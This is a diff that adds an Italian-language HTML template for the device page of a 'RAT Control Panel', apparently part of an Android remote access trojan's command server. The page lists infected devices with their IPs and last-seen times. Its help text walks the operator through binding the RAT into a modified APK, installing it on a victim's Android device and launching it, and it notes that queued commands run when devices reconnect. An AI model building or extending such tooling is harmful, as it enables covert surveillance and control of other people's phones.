@@ -1,0 +1,105 @@
+{% extends "base.html" %}
+
+{% block title %}Dispositivi - RAT Control Panel{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-12">
+        <div class="card">
+            <div class="card-header bg-primary text-white">
+                <h4 class="mb-0"><i class="bi bi-phone"></i> Dispositivi Connessi</h4>
+            </div>
+            <div class="card-body">
+                {% if devices %}
+                <div class="table-responsive">
+                    <table class="table table-hover">
+                        <thead>
+                            <tr>
+                                <th>ID Dispositivo</th>
+                                <th>Tipo</th>
+                                <th>IP</th>
+                                <th>Ultimo Contatto</th>
+                                <th>Stato</th>
+                                <th>Azioni</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            {% for device_id, device in devices.items() %}
+                            <tr>
+                                <td>{{ device_id }}</td>
+                                <td>{{ device.device_type }}</td>
+                                <td>{{ device.connection_ip }}</td>
+                                <td>
+                                    {% if device.last_seen %}
+                                    {{ device.last_seen|timestamp_to_time }}
+                                    {% else %}
+                                    N/A
+                                    {% endif %}
+                                </td>
+                                <td>
+                                    {% if (device.last_seen and (current_time - device.last_seen < 300)) %}
+                                    <span class="status-badge status-online">Online</span>
+                                    {% else %}
+                                    <span class="status-badge status-offline">Offline</span>
+                                    {% endif %}
+                                </td>
+                                <td>
+                                    <a href="/device/{{ device_id }}" class="btn btn-sm btn-primary">
+                                        <i class="bi bi-eye"></i> Dettagli
+                                    </a>
+                                </td>
+                            </tr>
+                            {% endfor %}
+                        </tbody>
+                    </table>
+                </div>
+                {% else %}
+                <div class="alert alert-info">
+                    <h5><i class="bi bi-info-circle"></i> Nessun dispositivo connesso</h5>
+                    <p>Non ci sono dispositivi connessi al server. Per connettere un dispositivo:</p>
+                    <ol>
+                        <li>Vai alla pagina <a href="/bind">Binding APK</a></li>
+                        <li>Crea un APK modificato</li>
+                        <li>Installa l'APK su un dispositivo Android</li>
+                        <li>Apri l'applicazione per avviare il RAT</li>
+                    </ol>
+                </div>
+                {% endif %}
+            </div>
+        </div>
+    </div>
+</div>
+
+{% if devices %}
+<div class="row mt-4">
+    <div class="col-12">
+        <div class="card">
+            <div class="card-header">
+                <h5 class="mb-0"><i class="bi bi-info-circle"></i> Informazioni sui Dispositivi</h5>
+            </div>
+            <div class="card-body">
+                <div class="alert alert-info">
+                    <h5><i class="bi bi-lightbulb"></i> Stato dei Dispositivi</h5>
+                    <p>I dispositivi sono considerati <strong>online</strong> se hanno contattato il server negli ultimi 5 minuti.</p>
+                    <p>Se un dispositivo è <strong>offline</strong>, potrebbe essere spento, disconnesso dalla rete, o l'applicazione potrebbe essere stata chiusa.</p>
+                </div>
+                
+                <div class="alert alert-warning">
+                    <h5><i class="bi bi-exclamation-triangle"></i> Comandi</h5>
+                    <p>I comandi inviati ai dispositivi offline verranno eseguiti quando il dispositivo si riconnetterà al server.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endif %}
+{% endblock %}
+
+{% block extra_js %}
+<script>
+    // Auto-refresh the page every 30 seconds
+    setTimeout(function() {
+        location.reload();
+    }, 30000);
+</script>
+{% endblock %}
